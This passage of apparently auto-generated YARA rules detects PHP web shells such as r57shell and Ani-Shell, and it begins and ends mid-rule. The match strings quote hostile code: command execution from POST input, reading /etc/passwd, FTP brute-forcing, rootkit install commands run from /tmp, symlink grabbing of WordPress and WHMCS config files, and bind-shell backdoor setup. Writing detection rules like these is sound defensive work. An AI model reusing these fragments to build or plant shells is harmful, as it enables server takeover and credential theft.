      $s5 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=red><a href=\\\"\".$surl.\"act=f&f=accounting.log&" ascii
      $s6 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=red><a href=\\\"\".$surl.\"act=f&f=accounting.log&" ascii
      $s7 = "stbyname($_SERVER[\"HTTP_HOST\"]).\">\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\"</a></b><br/>\";*/" fullword ascii
      $s8 = "echo \"<b>Your ip: <a href=http://\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Server ip: <a href=http:" ascii
      $s9 = "<p style=\"color: #fff\">Coded by jos_ali_joe<br><br># web: <u><a\" style=\"display: inline;" fullword ascii
      $s10 = "pair&ft=download\\\"><u><b>Download</b></u></a>, and use lcp.crack+ ?</font></b><br>\";}" fullword ascii
      $s11 = "array(\"<b>Processes</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s12 = ".urlencode(\"/usr/local/apache/conf\").\"&ft=txt\\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s13 = "\").\"&ft=txt\\\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s14 = "array(\"<b>PHP-Code</b>\",$surl.\"act=eval&d=%d&eval=//readfile('/etc/passwd');\")," fullword ascii
      $s15 = "if (file_get_contents(\"/etc/userdomains\")) {echo \"<b><font color=red><a href=\\\"\".$surl.\"act=f&f=userdomains&d=\".urlencod" ascii
      $s16 = "if (file_get_contents(\"/etc/syslog.conf\")) {echo \"<b><font color=red><a href=\\\"\".$surl.\"act=f&f=syslog.conf&d=\".urlencod" ascii
      $s17 = "\").\"&ft=txt\\\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>\";}" fullword ascii
      $s18 = "it from ever opening a port and you won't be able to connect to this proxy.</br></br></center>\";" fullword ascii
      $s19 = ".\"&ft=txt\\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s20 = "$r11  = $_SERVER['SERVER_ADDR'];$i94 = $_SERVER['REMOTE_ADDR'];$i71= gethostbyaddr($i94);$h42 = $_SERVER['HTTP_HOST'];$a83 = $_S" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _40004_ad32ffdce15b2dd53e356ec68010f86e16f216b9_103
{
   meta:
      description = "php17 - from files 40004.php, ad32ffdce15b2dd53e356ec68010f86e16f216b9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b01b319140874a26e78487a5ff83379378506c69136eebc089e3075751376a21"
      hash2 = "f46dc0482a25e972f5547bc72766e45d7a7abd4874b6792754734ecd35f9cc38"
   strings:
      $s1 = "<address>Apache Server at \".$_SERVER[\"HTTP_HOST\"].\" Port 80 </address>" fullword ascii
      $s2 = "if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password)" fullword ascii
      $s3 = "$chk_login = 1;" fullword ascii
      $s4 = "if($chk_login)" fullword ascii
      $s5 = "$psw = trim($_POST['pass']);" fullword ascii
      $s6 = "zwDWzY6U91Mo9rXwxumlPU6nTrd6Z1KmtNS9FeYAUt6lNapOW0ZAE8bBZKRmlrf7dSePg6NxSuuNybnh6Md4pKTeV0zvuQcjVdFG7FfrKVsbIn5x2WyVluF0xuxe5q+6" ascii
      $s7 = "e an ErrorDocument to handle the request.</p>" fullword ascii
      $s8 = "cTqO/t8jHnabgE2Yv6kZMW1iqxAQv2l/N491OUisQq+dOCcPWkbGRwTbn5+zAX/zNX/7vX/3Pv/3Nn/zib//zc52IJTMkTh7ZmL0Tnsqw8zIh9trlh0ZBOhk9+Xp2EAR" ascii
      $s9 = "JnSgYoqwx6PwE0xA1VRxAq4jJW9SFyBAukjdsGUPqiQQVCdpnm0omA4KfZYTxlJgdYRaMBgvbPp81waDxJ7/+T/9nZtRhR62eJGuyK0eVFRTzz//s3/7fYNj2Td7XwWq" ascii
      $s10 = "zKmR88EQodkZFLbdnmKB//fUBtX54WUDEkJhi+oLXhmjdwX30110wepBhAKwu7ud34RGG7MNgnnp4YCBdwvxlgPFIQ4BxVggYF4faYrO+TGZdyfglAZqxeEuBJKHiFWB" ascii
      $s11 = "$pass = md5(md5(md5($pass)));" fullword ascii
      $s12 = "$_SESSION['ses'] = \"$pass\";" fullword ascii
      $s13 = "dD/IKnDNWXagnSAdCL6Jsbnk8RpK5vIvrS9qxjFNWsXsDlEQP63V49lCvFrqIuYOCh0GbGpMwBpwCGNYdc2iLcoCpuAgR7rNlNOGksjBGZRLzoWXUGoBmCJM0TNlkKUG" ascii
      $s14 = "G/tBJdad2+qBpiLnDXKXTf5S3e2f1zFixNnU0Bqy5x+fixbF1dN0Ycy1nMLKkfHbNnpinFcmS7NGd0j+QjZQ8QRYoZ1SymQ21tYkAUuVxLrX5IDwqp2d5tVq1hqeXwrh" ascii
      $s15 = "M/7Be6auZ6bFydnvz1Bv3Offi8VQeuqnp6cmFen2w4QxulX7uThbPKy1D03unp/bThtmr3mwpucbdSe7wWr+uCmbLeapvP0yeLg+ddH2nKV1WrgaHnJyaOKn+4Na5yB8" ascii
      $s16 = "ug1i56kHtv/6zv/z5L//pr//7f/g3b+IcLkPiHFGKsPKmQbpZPaGSLEi6arzrddVk3xyFaonY6isMhznpmnPV95tUATuvvPPv7Imoy9l6YBkIagKv30o1jmVNM/9JiDQ" ascii
      $s17 = "ZpWbcSsJfJhT/+C/+/d//6//1xz8nywL0/7/7xR/9q//4L/70b/wEiNHIfcFVJjS4XWj5wFH/HzrniVk8vGyBwMTRC079Yvzinl0dEAc4MpHObsXOxWHQwBIFsQ3jThv" ascii
      $s18 = "udMCoyDfsnl2P48q/YalGaGayQBPN8r6zRTe5Jh2/KUjyRGSk/CUmsm4kVZa8dShcRmq+X4a35a/QcKBb92SxtsqEyZ01M5BBvx2Pv5oAWhZB5a35ljyccUABPXAlVQ1" ascii
      $s19 = "63lW31MeBZBwLdqVyczscbHHDS7clDXXHTh+XNx43bfvpQu21t51y7q5zrT+unbW1trBZ7109tATj7vaqvnbdw/6KrPBb2j5/d3eitHZq40pNSA1Spd7DQOs3s0Jp7aC" ascii
      $s20 = "iuwaHzTgNzc0TXcEeovmaZIpDuLYFe4oVTYbHg2lNwjCrSbybmISbXpowRcu7ZcM0ZDRdnFcKI50t1dVMcbAMM7+9FKkU1Bmg2CqLjoPq2jWl6UcOVLCPt5t2f5LGP1B" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _01a00e6583ed3789694d600fa831392aa785c5f9_528f2ab667dc8492e589a00c579edaaf16f03859_7a088b0114a6147072c70403f5b3c47fe0145984__104
{
   meta:
      description = "php17 - from files 01a00e6583ed3789694d600fa831392aa785c5f9.php, 528f2ab667dc8492e589a00c579edaaf16f03859.php, 7a088b0114a6147072c70403f5b3c47fe0145984.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
      hash2 = "5aad1a2e4c160a826e6d62b34f0d1ecc9bd9ffc688774fb055f7e0cf50d08e66"
      hash3 = "6b84760d22eabc648f8ecd31f6ef51c4b679e1e9329bcaade78878ca8a884c32"
      hash4 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $s2 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s3 = ": '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));" fullword ascii
      $s4 = "$cmd = \"cmd.exe\";" fullword ascii
      $s5 = "$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'" fullword ascii
      $s6 = "ru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');" fullword ascii
      $s7 = "$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'" fullword ascii
      $s8 = ": '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' " fullword ascii
      $s9 = "echo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"" fullword ascii
      $s10 = "fwrite($pipes[0], \"\".$_POST['command'].\"\\r\\n\");" fullword ascii
      $s11 = "$filecontent = \"?\".\">\".$_POST['filecontent'].\"<?\";" fullword ascii
      $s12 = ": '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');" fullword ascii
      $s13 = "$tb->formheader(''.$action.' \"target=\"_blank' ,'" fullword ascii
      $s14 = "if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];" fullword ascii
      $s15 = "elseif ($_POST['do'] == 'downloads') {" fullword ascii
      $s16 = "!\\n*/\\neval(gzinflate(base64_decode('$filecontent')));\\n\".\"?>\";" fullword ascii
      $s17 = "\".$_POST['regname'].\", \".$_POST['regval'].\", \".$_POST['regtype'].\" " fullword ascii
      $s18 = "$filecontent = $_POST['filecontent'];" fullword ascii
      $s19 = "$tb->headerform(array('content'=>'" fullword ascii
      $s20 = ": <input type=\"checkbox\" name=\"change\" value=\"yes\" onclick=\"javascript:alert(\\'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_27_9_44b8eca32932e4e42f0d59dfe67014b2bba88292_5a42c89ac7b0e1b19603088b61aeed203e026fc3_105
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 27.9.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash3 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash4 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
   strings:
      $x1 = "echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $s2 = "$logfile = $tmpdir_logs.\"ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s3 = "if (trim($cmd) == \"ps aux\") {$act = \"processes\";}" fullword ascii
      $s4 = "echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=text" ascii
      $s5 = "\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"<?php echo htmlspecialchars($sql_db); ?>\"><input type=\"hidden\" name=" ascii
      $s6 = "ex(\"cd /tmp;cd .setan;./xh -s [kmod] ./httpd start\");" fullword ascii
      $s7 = "echo \"<div class=\\\"shell\\\"></br><b>Reading $get:</b><br><br><textarea rows=10 cols=50>$source</textarea><br>\";" fullword ascii
      $s8 = "$login_txt = \"Apache Error: Restricted File\";" fullword ascii
      $s9 = "$out = \"# Dumped by \".$shver.\"" fullword ascii
      $s10 = "ex(\"cd /tmp;cd .setan;chmod 777 httpd\");" fullword ascii
      $s11 = "$msg = $_POST['proxyhostmsg'];" fullword ascii
      $s12 = "$execcmd = $_REQUEST['cmd'];" fullword ascii
      $s13 = "$logemail)/10)).\"\\\"><br><br><input type=submit name=submit value=\\\"Brute\\\"></form>\";" fullword ascii
      $s14 = "me\"].\". Can't copy \\\"\".$uploadfile[\"tmp_name\"].\"\\\" to \\\"\".$uploadpath.$destin.\"\\\".</br></br>\";}" fullword ascii
      $s15 = "if (!$ret) {echo \"</br>Can't execute \\\"\".$handler.\"\\\"!\";}" fullword ascii
      $s16 = "if (!function_exists(\"mysql_dump\")){" fullword ascii
      $s17 = "ex(\"cd /tmp; rm -r .setan\"); " fullword ascii
      $s18 = "ex(\"cd /tmp;tar -zxvf hantu.tgz\");" fullword ascii
      $s19 = "ex(\"cd /tmp;cd .setan;chmod 777 xh\");" fullword ascii
      $s20 = "echo \"</br>Trying To Get File <font color=#000099><b>$get</b></font><br>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _20784cd31c22ddaa849b6c93042df34c1d462ab9_6f1a2aa579a8ecd60d17677f0cd211c4090500f6_7bd7bb6237c7654d933dc363cabbc553f9d21382__106
{
   meta:
      description = "php17 - from files 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash3 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash4 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s2 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s3 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s4 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s5 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s6 = "echo sr(45,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s7 = "/* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affecte" fullword ascii
      $s8 = "if($error) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error.\"</b></font></td></tr></table>" fullword ascii
      $s9 = "if(($error = @ocierror())) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error['message'].\"</b>" fullword ascii
      $s10 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s11 = "$res=@pg_query($db,\"SELECT datname FROM pg_database WHERE datistemplate='f'\");" fullword ascii
      $s12 = "$res = @pg_query($db,\"SELECT * FROM \".$_POST['mysql_tbl'].\"\");" fullword ascii
      $s13 = "$res = @mssql_query(\"SELECT * FROM \".$_POST['mysql_tbl'].\"\", $db);" fullword ascii
      $s14 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s15 = "$str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbnam" ascii
      $s16 = "@ociexecute($stat);" fullword ascii
      $s17 = "for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo \"<td><font face=Verdana size=-2>&nbsp;\".htmlspecialchars(@ociresult($s" fullword ascii
      $s18 = "]):(\"dump.sql\"))));" fullword ascii
      $s19 = "if($rowcount != 0) {echo \"<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>\".$rowcount.\"</b></font><" fullword ascii
      $s20 = "else { if(($rows = @pg_affected_rows($res))>=0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affected rows" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_107
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 502adcbc50636b667202497c1f398a36413e3284.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 63187568f13bf233f781f008c528b0e160650211.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash10 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash11 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash12 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash13 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash14 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash15 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash16 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash17 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
      hash18 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash19 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash20 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
      hash21 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sq" ascii
      $s2 = "if (@ftp_login($sock,$login,$pass))" fullword ascii
      $s3 = "$uploadfile = $HTTP_POST_FILES[\"uploadfile\"];" fullword ascii
      $s4 = "while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = \"_\".$i;} $destin = \"index\".$b.\".html\"; $i++;}}" fullword ascii
      $s5 = "if ($sql_act == \"processes\")" fullword ascii
      $s6 = "elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile).\"\\\"</b>: access denied\";}" fullword ascii
      $s7 = "if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile).\"\\\"</b>: object alredy exists\";}" fullword ascii
      $s8 = "elseif ($sql_act == \"dump\")" fullword ascii
      $s9 = "function mysql_dump($set)" fullword ascii
      $s10 = "if ($n == $hexdump_rows)" fullword ascii
      $s11 = "global $HTTP_POST_FILES;" fullword ascii
      $s12 = "if (empty($d)) {$d = realpath(\".\");} elseif(realpath($d)) {$d = realpath($d);}" fullword ascii
      $s13 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl)) and (!eregi(\"ftp://\",$uploadurl))) {echo \"<b>Incor" ascii
      $s14 = "if (count(array_merge($sess_data[\"copy\"],$sess_data[\"cut\"])) > 0 and ($usefsbuff))" fullword ascii
      $s15 = "elseif ($ft == \"download\")" fullword ascii
      $s16 = "function str2mini($content,$len)" fullword ascii
      $s17 = "echo \"</td><td width=\\\"100%\\\" height=\\\"1\\\" valign=\\\"top\\\">\";" fullword ascii
      $s18 = "if ($act == \"ftpquickbrute\")" fullword ascii
      $s19 = "mlspecialchars($sql_passwd).\"\\\")</b><br>\";" fullword ascii
      $s20 = "\"text\"=>$search_text, \"text_regexp\"=>$search_text_regxp," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0x6544 or uint16(0) == 0x2a2f ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _6369477fc18212ac99a6bcae28914a72c69b5e62_6ae4cdb21f4c6adaadefeff8994ce205d9e09dc0_108
{
   meta:
      description = "php17 - from files 6369477fc18212ac99a6bcae28914a72c69b5e62.php, 6ae4cdb21f4c6adaadefeff8994ce205d9e09dc0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a8ac1a05ad65ecce5d956bb76ae30bc3a5ccd81fbaeb7cacceaa3fafeac8f56"
      hash2 = "167e973c80db9daf4ac8507c91983522a4465b65bcbef4ea6c3eb151f6287d0e"
   strings:
      $s1 = "$dirstr .= pack('V',$this->datastr_len ); // relative offset of local header " fullword ascii
      $s2 = "$dirstr .= pack('V', 32 );             // external file attributes - 'archive' bit set " fullword ascii
      $s3 = "$num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\" $bitunit[$key]\"; " fullword ascii
      $s4 = "if($dodozip -> startfile(\"$_REQUEST[todir]$_REQUEST[zipname]\"))" fullword ascii
      $s5 = "$dodozip -> addfile(implode('',file(\"$dir/$file\")),\"$dir/$file\"); " fullword ascii
      $s6 = "if (!in_array(end(explode(\".\",$file)), $dodozip -> filefilters))" fullword ascii
      $s7 = "if(realpath($dodozip ->gzfilename)!=realpath(\"$dir/$file\"))" fullword ascii
      $s8 = "$dodozip -> addfile(implode('',file(\"$dir\")),\"$dir\"); " fullword ascii
      $s9 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s10 = "if(!strrchr(strtolower($_REQUEST[zipname]),'.')=='.zip') " fullword ascii
      $s11 = "pname] (\".num_bitunit(filesize(\"$_REQUEST[todir]$_REQUEST[zipname]\")).\")</a>\"; " fullword ascii
      $s12 = "if(realpath($dodozip ->gzfilename)!=realpath(\"$dir\"))" fullword ascii
      $s13 = "$dodozip -> SetFileFilter($_REQUEST[\"file_type\"]);" fullword ascii
      $s14 = "$this -> dirstr_len += strlen($dirstr); " fullword ascii
      $s15 = "$this -> datastr_len += $my_datastr_len; " fullword ascii
      $s16 = "if(!empty($dodozip -> filefilters))" fullword ascii
      $s17 = "pack('V', $this -> dirstr_len) . " fullword ascii
      $s18 = "pack('v', $this -> file_count) . " fullword ascii
      $s19 = "pack('V', $this -> datastr_len) . " fullword ascii
      $s20 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii
   condition:
      ( uint16(0) == 0x683c and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc134acecdf6e441eb53718b93a3cda81c2b453_4_0_109
{
   meta:
      description = "php17 - from files 1bc134acecdf6e441eb53718b93a3cda81c2b453.php, 4.0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
      hash2 = "f4c321991ec2b24fb70ceeade0108f180d991ca0d45bef839379e7c07d813a1d"
   strings:
      $s1 = "$wp2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/blog/wp-config.php\";" fullword ascii
      $s2 = "<a href='sym/root/home/\".$user['name'].\"/public_html' target='_blank'>symlink </a>" fullword ascii
      $s3 = "$wh2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/support/configuration.php\";" fullword ascii
      $s4 = "$vb2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/vb/includes/config.php\";" fullword ascii
      $s5 = "$vb3=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/forum/includes/config.php\";" fullword ascii
      $s6 = "$wh4=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/client/configuration.php\";" fullword ascii
      $s7 = "$wh1=$pageURL.\"/sym/root/home/\".$user['name'].\"public_html/clients/configuration.php\";" fullword ascii
      $s8 = "$jo2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/joomla/configuration.php\";" fullword ascii
      $s9 = "$wh3=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/client/configuration.php\";" fullword ascii
      $s10 = "$vb1=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/includes/config.php\";" fullword ascii
      $s11 = "$jo1=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/configuration.php\";" fullword ascii
      $s12 = "$wpl=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/wp-config.php\";" fullword ascii
      $s13 = "<div class='dom'><a target='_blank' href=http://www.\".$domsws[1][0].\"/>\".$site.\" </a> </div>" fullword ascii
      $s14 = "$config=\" <a href='\".$vb3.\"' target='_blank'>vBulletin</a>\";" fullword ascii
      $s15 = "$config=\" <a href='\".$vb1.\"' target='_blank'>vBulletin</a>\";" fullword ascii
      $s16 = "$config=\" <a href='\".$vb2.\"' target='_blank'>vBulletin</a>\";" fullword ascii
      $s17 = "$config =\" <a href='\".$wh2.\"' target='_blank'>WHMCS</a>\";" fullword ascii
      $s18 = "$config=\"<a href='\".$wp2.\"' target='_blank'>Wordpress</a>\";" fullword ascii
      $s19 = "$config=\" <a href='\".$wh5.\"' target='_blank'>WHMCS</a>\";" fullword ascii
      $s20 = "$config=\"<a href='\".$wpl.\"' target='_blank'>Wordpress</a>\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x2020 or uint16(0) == 0x3f3c ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _a574138c88289490300cee616b9357f807e582b6_Ani_Shell_Ani_Shell__2__110
{
   meta:
      description = "php17 - from files a574138c88289490300cee616b9357f807e582b6.php, Ani-Shell.php, Ani-Shell__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash2 = "0a5f8c8a6f82be68b260ebcbd8d917e9209f548ea1ca5827e7d27d6653f8170a"
      hash3 = "c027a23d19d1eeb041c657ae53f8c14358fe84e1094aba16757c26ca835b5a00"
   strings:
      $x1 = "$passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionaneesh " fullword ascii
      $x2 = "socket_write($client , ($os == \"Windows\") ? exec_all(\"date /t & time /t\")  . \"\\n\" . exec_all(\"ver\") : exec_all(\"date" fullword ascii
      $s3 = "fputs ($sockfd ,\"\\n=================================================================\\nAni-Shell | C0d3d by lionanees" fullword ascii
      $s4 = "/* Accept incoming requests and handle them as child processes */" fullword ascii
      $s5 = "fputs($sockfd , \"\\n\" . exec_all($command) . \"\\n\\n\");" fullword ascii
      $s6 = "$dateAndTime = exec_all(\"time /t & date /T\");" fullword ascii
      $s7 = "| India\\n=================================================================\\n\\n0xPassword : \";" fullword ascii
      $s8 = "echo \"<p class='alert_red'>Process Not Found Running! Backdoor Setup FAILED :(</p>\";" fullword ascii
      $s9 = "$passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionaneesh | Ind" ascii
      $s10 = "$input = socket_read($client, strlen($pass) + 2); // +2 for \\r\\n" fullword ascii
      $s11 = "echo \"<p class='alert_green'>Process Found Running! Backdoor Setuped Successfully! :D</p>\";" fullword ascii
      $s12 = "$commandPrompt =\"(Ani-Shell)[$]> \";" fullword ascii
      $s13 = "socket_write($client , exec_all($cmd));" fullword ascii
      $s14 = "\") . \"\\n\" . exec_all(\"uname -a\"));" fullword ascii
      $s15 = "$sysinfo = exec_all(\"uname -a\");" fullword ascii
      $s16 = "exec_all(\"chmod +x bind.py ; ./bind.py\");" fullword ascii
